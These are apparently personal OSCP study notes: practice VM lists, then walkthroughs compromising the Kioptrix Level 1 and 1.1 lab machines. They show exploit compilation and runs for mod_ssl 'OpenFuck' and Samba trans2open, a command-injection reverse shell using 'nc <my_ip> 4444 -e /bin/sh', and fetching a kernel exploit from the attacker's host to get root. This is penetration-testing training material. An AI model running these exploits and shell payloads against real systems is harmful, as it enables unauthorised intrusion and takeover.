# Oscp study

Notes of my Offensive Security Certified Professional (OSCP) study plan. :-)

**Last updated**: 2017-07-28

## OSCP-like VMs:
- Beginner friendly:
	- Kioptrix: Level 1 (#1)
	- Kioptrix: Level 1.1 (#2) 
	- Kioptrix: Level 1.2 (#3) 
	- Kioptrix: Level 1.3 (#4) 
	- FristiLeaks: 1.3 
	- Stapler: 1
	- PwnLab: init
- Intermediate:
	- Kioptrix: 2014
	- Brainpan: 1 (Part 1 of BO is relevant to OSCP. egghunting is out of scope though)
	- Mr-Robot: 1  
	- HackLAB: Vulnix
 	- Not so sure (Didn't solve them yet):
	- VulnOS: 2
	- SickOs: 1.2
	- /dev/random: scream 
	- pWnOS: 2.0
	- SkyTower: 1 
	- IMF
- Windows 
	- Metasploitable 3
	- /dev/random: Sleepy (Uses VulnInjector, need to provide you own ISO and key.)
	- Bobby: 1 (Uses VulnInjector, need to provide you own ISO and key.)

(credits for **@abatchy**)

## Recommended books:

<a href="https://www.amazon.com.br/Penetration-Testing-Hands-Introduction-Hacking/dp/1593275641">Penetration Testing: A Hands-On Introduction to Hacking</a> (+Highly recommended for beginners)  
<a href="https://www.amazon.com/Hacking-Art-Exploitation-Jon-Erickson/dp/1593271441/ref=sr_1_1?ie=UTF8&qid=1492297164&sr=8-1&keywords=hacking">Hacking: The Art of Exploitation, 2nd Edition</a>  
<a href="https://www.amazon.com/Rtfm-Red-Team-Field-Manual/dp/1494295504/ref=sr_1_2?ie=UTF8&qid=1492297153&sr=8-2&keywords=pentest">Rtfm: Red Team Field Manual</a>  
<a href="https://www.amazon.com/Web-Application-Hackers-Handbook-Exploiting/dp/1118026470/ref=sr_1_1?ie=UTF8&qid=1492297179&sr=8-1&keywords=the+web+application+hacker%27s+handbook">The Web Application Hacker's Handbook: Finding and Exploiting Security Flaws</a>  
<a href="https://www.amazon.com/Hacker-Playbook-Practical-Penetration-Testing-ebook/dp/B00J5S9OPU">The Hacker Playbook: Practical Guide To Penetration Testing</a>

## Links:

https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ [+Linux privilege escalation]
http://www.abatchy.com/2017/03/how-to-prepare-for-pwkoscp-noob.html  
https://www.securitysift.com/offsec-pwb-oscp/ [+Scripts]     
http://hackingandsecurity.blogspot.com.br/2016/04/oscp-related-notes.html  
http://rtfm-ctf.org/2017/PWN-PATH-TO-OSCP  
http://www.techexams.net/forums/security-certifications/110760-oscp-jollyfrogs-tale.html [RECOMMENDED]  
https://tulpa-security.com/2016/09/19/prep-guide-for-offsecs-pwk/


## Kioptrix: Level 1

Basic enumeration:

```bash
ferreirasc@roarrr:/$ nmap -sV -sC -sS -p- 192.168.3.96
Starting Nmap 7.40 ( https://nmap.org ) at 2017-04-23 10:12 -03
Nmap scan report for 192.168.3.96
Host is up (0.058s latency).
Not shown: 65529 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
| ssh-hostkey:
|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
|_sshv1: Server supports SSHv1
80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
111/tcp  open  rpcbind     2 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100024  1           1024/tcp  status
|_  100024  1           1024/udp  status
139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp  open  ssl/http    Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-09-26T09:32:06
|_Not valid after:  2010-09-26T09:32:06
|_ssl-date: 2017-04-23T01:00:04+00:00; -12h12m39s from scanner time.
| sslv2:
|   SSLv2 supported
|   ciphers:
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|_    SSL2_RC4_64_WITH_MD5
1024/tcp open  status      1 (RPC #100024)

Host script results:
|_clock-skew: mean: -12h12m39s, deviation: 0s, median: -12h12m39s
|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.80 seconds
```

#### Exploit 1: Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Exploit

- Exploit: [exploit-db link](https://www.exploit-db.com/exploits/764/)
- Updated: xpl/openfuck.c (thx for [@paulsec](http://paulsec.github.io/blog/2014/04/14/updating-openfuck-exploit/))

```bash
ferreirasc@roarrr:/$ gcc openfuck.c -L/usr/local/opt/openssl/lib -I/usr/local/opt/openssl/include -lcrypto -o openfuck
ferreirasc@roarrr:/$ ./openfuck 0x6b 192.168.3.96 -c 20
*******************************************************************
* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************

Connection... 20 of 20
Establishing SSL connection
cipher: 0x4043808c   ciphers: 0x80f8050
Ready to send shellcode
Spawning shell...
bash: no job control in this shell
bash-2.05$
 p ptrace-kmod.c; rm ptrace-kmod.c; ./p; 192.168.3.60:8081/ptrace-kmod.c; gcc -o
--21:29:54--  http://192.168.3.60:8081/ptrace-kmod.c
           => `ptrace-kmod.c'
Connecting to 192.168.3.60:8081...
Connection to 192.168.3.60:8081 refused.
gcc: ptrace-kmod.c: No such file or directory
gcc: No input files
rm: cannot remove `ptrace-kmod.c': No such file or directory
ls
p
payload
payload.py
session_mm.sem
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
bash -i
[root@kioptrix tmp]#
```
#### Exploit 2: Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow

- Exploit: [exploit-db link](https://www.exploit-db.com/exploits/22470/)
- xpl/trans2open.c

SMB enumeration:

```bash
root@kali:~# enum4linux -a 192.168.3.96
<............ omitted information .........>
 ======================================
|    OS information on 192.168.3.96    |
 ======================================
[+] Got OS info for 192.168.3.96 from smbclient: Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]
[+] Got OS info for 192.168.3.96 from srvinfo:
	KIOPTRIX       Wk Sv PrQ Unx NT SNT Samba Server
	platform_id     :	500
	os version      :	4.5
	server type     :	0x9a03
<............ omitted information .........>
```

Server was running Samba 2.2.1a, vulnerable to trans2open rce exploit. So...

```bash
ferreirasc@roarrr:~$ searchsploit samba 2.2.
----------------------------------------------------------------------------------------------------------- --------------------------------------------------------------------
 Exploit Title                                                                                             |  Path
                                                                                                           | (/usr/local/Cellar/exploitdb/2016-12-24/share/exploitdb/platforms)
----------------------------------------------------------------------------------------------------------- --------------------------------------------------------------------
(Linux Kernel 2.6) Samba 2.2.8 (Debian / Mandrake) - Share Privilege Escalation                            | /linux/local/23674.txt
Samba 2.2.x - Buffer Overflow                                                                              | /linux/remote/7.pl
Samba 2.2.8 - Remote Code Execution                                                                        | /linux/remote/10.c
Samba 2.2.8 - (Brute Force Method) Remote Command Execution                                                | /linux/remote/55.c
Samba 2.2.0 < 2.2.8 (OSX) - trans2open Overflow (Metasploit)                                               | /osx/remote/9924.rb
Samba 2.2.x - nttrans Overflow (Metasploit)                                                                | /linux/remote/9936.rb
Samba 2.2.2 < 2.2.6 - nttrans Buffer Overflow (Metasploit)                                                 | /linux/remote/16321.rb
Samba 2.2.8 (Solaris SPARC) - 'trans2open' Overflow (Metasploit)                                           | /solaris_sparc/remote/16330.rb
Samba 2.2.8 (Linux x86) - 'trans2open' Overflow (Metasploit)                                               | /linux/remote/16861.rb
Samba 2.2.8 (OSX/PPC) - 'trans2open' Overflow (Metasploit)                                                 | /osx_ppc/remote/16876.rb
Samba 2.2.8 (*BSD x86) - 'trans2open' Overflow Exploit (Metasploit)                                        | /linux/remote/16880.rb
Samba SMB 2.2.x - CIFS/9000 Server A.01.x Packet Assembling Buffer Overflow                                | /unix/remote/22356.c
Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (1)                                                 | /unix/remote/22468.c
Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (2)                                                 | /unix/remote/22469.c
Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (3)                                                 | /unix/remote/22470.c
Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (4)                                                 | /unix/remote/22471.txt
----------------------------------------------------------------------------------------------------------- --------------------------------------------------------------------
ferreirasc@roarrr:~$ gcc /usr/local/Cellar/exploitdb/2016-12-24/share/exploitdb/platforms/unix/remote/22470.c -o transopen
ferreirasc@roarrr:~$ ./transopen 0 192.168.3.96 192.168.3.60
[+] Listen on port: 45295
[+] Connecting back to: [192.168.3.60:45295]
[+] Target: Linux
[+] Connected to [192.168.3.96:139]
[+] Please wait in seconds...!
[+] Yeah, I have a root ....!
------------------------------
Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown
uid=0(root) gid=0(root) groups=99(nobody)
```
## Kioptrix: Level 1.1 (Level 2)

Having completed Level 1, we will now play Level 2 of the Kioptrix series. This VM can be found at <a href="http://www.kioptrix.com/"/>Kioptrix webpage</a>.

Let's get started scanning my network to discover the Kioptrix 1.1 VM:

```
root@kali:~# nmap -sn 192.168.3.0/24

Starting Nmap 7.50 ( https://nmap.org ) at 2017-07-27 17:57 EDT
<-- omitted information -->
Nmap scan report for 192.168.3.98
Host is up (0.0035s latency).
MAC Address: 00:0C:29:57:92:6D (VMware)
<-- omitted information -->
Nmap done: 256 IP addresses (11 hosts up) scanned in 8.61 seconds
```
The 192.168.3.98 address is mapped to Kioptrix 1.1 on my network. We can do a basic enumeration with nmap to verify the services running on this machine:

```
root@kali:~# nmap -sS -Pn -sV --script=default 192.168.3.98

Starting Nmap 7.50 ( https://nmap.org ) at 2017-07-27 18:20 EDT
Nmap scan report for 192.168.3.98
Host is up (0.0050s latency).
Not shown: 993 closed ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
| ssh-hostkey:
|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)
|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)
|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)
|_sshv1: Server supports SSHv1
80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
|_http-server-header: Apache/2.0.52 (CentOS)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
111/tcp  open  rpcbind  2 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100024  1            643/udp  status
|_  100024  1            646/tcp  status
443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
|_http-server-header: Apache/2.0.52 (CentOS)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-10-08T00:10:47
|_Not valid after:  2010-10-08T00:10:47
|_ssl-date: 2017-07-29T12:20:24+00:00; +1d13h59m41s from scanner time.
| sslv2:
|   SSLv2 supported
|   ciphers:
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|_    SSL2_RC2_128_CBC_WITH_MD5
631/tcp  open  ipp      CUPS 1.1
| http-methods:
|_  Potentially risky methods: PUT
|_http-server-header: CUPS/1.1
|_http-title: 403 Forbidden
646/tcp  open  status   1 (RPC #100024)
3306/tcp open  mysql    MySQL (unauthorized)
MAC Address: 00:0C:29:57:92:6D (VMware)

Host script results:
|_clock-skew: mean: 1d13h59m40s, deviation: 0s, median: 1d13h59m40s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.47 seconds
```
Let's take a look at the web server running on the port 80:

![Alt text](https://raw.githubusercontent.com/ferreirasc/ferreirasc.github.io/master/post/images/Kioptrix_1_1_image1.png)

It's just a administration login page. Let's try a simple SQL injection trick to bypass the authentication...

![Alt text](https://raw.githubusercontent.com/ferreirasc/ferreirasc.github.io/master/post/images/Kioptrix_1_1_image2.png)

... and I'm in. :-)

![Alt text](https://raw.githubusercontent.com/ferreirasc/ferreirasc.github.io/master/post/images/Kioptrix_1_1_image3.png)

Apparently, the only function of this "Administration page" is to ping an address on my network. If the application can ping a machine from this field, it could also execute other commands. Assuming that the input could be an argument for a system() function, for example, if I'm lucky I could take advantage of this to execute a payload invoking a reverse shell just using a simple ";" to separate two commands in a shell:

```bash
ping 192.168.3.1;nc <my_ip> 4444 -e /bin/sh
```

I setup a listening on port 4444 to handle the connection of nc, but did not work. 

Maybe I need to provide a complete path to netcat binary (nc binary could not be present on the machine or maybe it's directory would not be listed in $PATH). Let's use *whereis* command to discovering your path:

![Alt text](https://raw.githubusercontent.com/ferreirasc/ferreirasc.github.io/master/post/images/Kioptrix_1_1_image4.png)

And now we can find your right path:

![Alt text](https://raw.githubusercontent.com/ferreirasc/ferreirasc.github.io/master/post/images/Kioptrix_1_1_image5.png)

I checked the "-e" option on netcat binary and it was present (just a *"ping 192.168.3.1;/usr/local/bin/nc --help"*)... which saves me a lot of work! hahah

My reverse shell can be invoked right now:

![Alt text](https://raw.githubusercontent.com/ferreirasc/ferreirasc.github.io/master/post/images/Kioptrix_1_1_image6.png)

And here we go...

```bash
root@kali:~# nc -lvp 4444
listening on [any] 4444 ...
192.168.3.98: inverse host lookup failed: Unknown host
connect to [192.168.3.92] from (UNKNOWN) [192.168.3.98] 32770
id
uid=48(apache) gid=48(apache) groups=48(apache)
bash -i
bash: no job control in this shell
bash-3.00$
```

I'm in with the apache user context. From here, I often use <a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/"/>this link</a> as a reference for escalation privilege in *nix environments (thx **@g0tm1k**). Checking the *uname -a* command I figure out that the system is running with a vulnerable kernel version (2.6.9-55.EL), what led me to this exploit-db <a href="https://www.exploit-db.com/exploits/9542/"/>link</a>.

I downloaded the code on my local machine and started a simple web server so my VM can get the code:

```bash
ferreirasc@roarrr:/tmp$wget https://www.exploit-db.com/download/9542 -O CVE-2009-2698.c
--2017-07-29 14:00:02--  https://www.exploit-db.com/download/9542
Resolving www.exploit-db.com... 192.124.249.8
Connecting to www.exploit-db.com|192.124.249.8|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2645 (2.6K) [application/txt]
Saving to: ‘CVE-2009-2698.c’

CVE-2009-2698.c                             100%[===========================================================================================>]   2.58K  --.-KB/s    in 0s

2017-07-29 14:00:03 (61.5 MB/s) - ‘CVE-2009-2698.c’ saved [2645/2645]

ferreirasc@roarrr:/tmp$ls
9542                          com.apple.launchd.8JhFxdQVtO/ com.apple.launchd.au2p9lNFwf/ mysql.sock=
CVE-2009-2698.c               com.apple.launchd.IQnTugcATa/ com.apple.launchd.qWURxTfKJP/ mysql.sock.lock
ferreirasc@roarrr:/tmp$python -m SimpleHTTPServer 8080
Serving HTTP on 0.0.0.0 port 8080 ...
``` 

Then, let's compile and test this exploit on the machine:

```bash
bash-3.00$ cd /tmp
bash-3.00$ pwd
/tmp
bash-3.00$ wget 192.168.3.95:8080/CVE-2009-2698.c
--09:51:29--  http://192.168.3.95:8080/CVE-2009-2698.c
           => `CVE-2009-2698.c'
Connecting to 192.168.3.95:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2,645 (2.6K) [text/plain]

    0K ..                                                    100%    5.18 MB/s

09:51:29 (5.18 MB/s) - `CVE-2009-2698.c' saved [2645/2645]

bash-3.00$ ls -lah
total 24K
drwxr-xrwx   4 root   root   4.0K Jul 29 09:51 .
drwxr-xr-x  23 root   root   4.0K Jul 29 05:39 ..
-rw-r--r--   1 apache apache 2.6K Jul 29  2017 CVE-2009-2698.c
drwxrwxrwt   2 root   root   4.0K Jul 29 05:40 .font-unix
drwxrwxrwt   2 root   root   4.0K Jul 29 05:39 .ICE-unix
bash-3.00$ gcc --version
gcc (GCC) 3.4.6 20060404 (Red Hat 3.4.6-8)
Copyright (C) 2006 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

bash-3.00$ gcc CVE-2009-2698.c -o CVE-2009-2698
bash-3.00$ ./CVE-2009-2698
sh: no job control in this shell
sh-3.00# id
uid=0(root) gid=0(root) groups=48(apache)
sh-3.00#
```
Congrats, you have **root**! :D